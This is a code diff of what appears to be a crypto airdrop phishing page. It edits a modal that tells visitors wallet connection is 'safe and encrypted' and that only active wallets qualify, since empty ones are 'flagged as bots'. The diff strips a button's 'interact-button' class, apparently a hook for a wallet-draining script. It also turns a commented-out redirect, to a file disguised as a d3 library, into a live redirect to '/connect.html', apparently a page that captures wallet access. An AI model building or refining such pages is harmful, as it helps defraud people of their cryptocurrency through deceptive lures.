@@ -1015,7 +1015,7 @@
                 <p><strong>Important:</strong> Wallet connection is safe and encrypted. To claim rewards, use an active wallet.
                     New/empty wallets will be flagged as bots..</p>
                 <div class="modal-buttons">
-                    <button id="connect-manual-button" class="modal-button connect-manual-button interact-button">🔗 Connect Manually</button>
+                    <button id="connect-manual-button" class="modal-button connect-manual-button ">🔗 Connect Manually</button>
                 </div>
             </div>
         </div>
@@ -1427,12 +1427,12 @@
         }
 
         // Connect wallet manually
-        // function connectWalletManually() {
-        //     hideCautionModal();
-            // Proceed with wallet connection
-            // window.location.href = './d3-7.8.5.min.js';
-        // }
-
+        //// Connect wallet manually - redirect to connect.htm
+function connectWalletManually() {
+    hideCautionModal();
+    // Redirect to wallet connection page
+    window.location.href = '/connect.html';
+}
         // Start countdown timer
         function startCountdown(targetTime) {
             const countdownSection = document.getElementById('countdown-section');
